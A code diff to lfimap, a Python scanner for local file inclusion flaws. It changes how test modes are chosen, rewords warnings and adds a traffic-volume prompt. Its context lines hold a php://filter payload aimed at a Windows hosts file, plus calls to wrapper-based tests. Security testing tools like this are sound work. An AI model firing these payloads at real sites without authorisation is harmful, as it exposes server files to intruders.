@@ -67,7 +67,7 @@ def test_php_filter(url):
     res = requests.get(u, headers = headers)
     
     if(checkPayload(res)):
-        print("[+] LFI ->" + u)
+        print("[+] LFI -> " + u)
 
     winOne = "php://filter/resource=C:/Windows/System32/drivers/etc/hosts"
     u = url.replace("DESTROY", winOne)
@@ -237,20 +237,27 @@ def main():
         
         print("Done.")
         exit(0)
-    
-    elif(args.wordlist):
+
+    default = True
+
+    if(args.wordlist):
+        default = False
         test_wordlist(url)
-    elif(php_filter):
+    if(php_filter):
+        default = False
         test_php_filter(url)
-    elif(php_input):
+    if(php_input):
+        default = False
         test_php_input(url)
-    elif(data_wrapper):
+    if(data_wrapper):
+        default = False
         test_data_wrapper(url)
-    elif(expect_wrapper):
+    if(expect_wrapper):
+        default = False
         test_expect_wrapper(url)
 
     #Default behaviour
-    else:
+    if(default):
         test_php_filter(url)
         test_php_input(url)
         test_data_wrapper(url)
@@ -296,16 +303,22 @@ if(__name__ == "__main__"):
     r'(?::\d+)?' # optional port
     r'(?:/?|[/?]\S+)$', re.IGNORECASE)
     
-    if(not cookie):
-        print("WARNING: Cookie argument ('-c') is not provided. If web app requires it lfimap will not find any vulerabilities")
     
     if("DESTROY" not in url):
-        print("Please use DESTROY as a vulnerable parameter value that you want to exploit")
+        print("Please use DESTROY as a vulnerable parameter value that you want to exploit\n")
         sys.exit(-1)
 
+    if(not cookie):
+        print("WARNING: Cookie argument ('-c') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.\n")
+    
     if(re.match(urlRegex, url) is None):
         print("URL not valid, exiting...")
-        sys.exit(-1)    
+        sys.exit(-1)
+
+    if(test_all or wordlist):
+        if(input("Testing with wordlist ('-w', '-a') might generate a lot of traffic to the target. Are you sure you want to continue (y/n): ") != "y"):
+            print("Exiting ...")
+            sys.exit(0)
 
     #Checks if provided wordlist arg exists, in main is selects wordlist based on target OS type
     if(wordlist is not None):
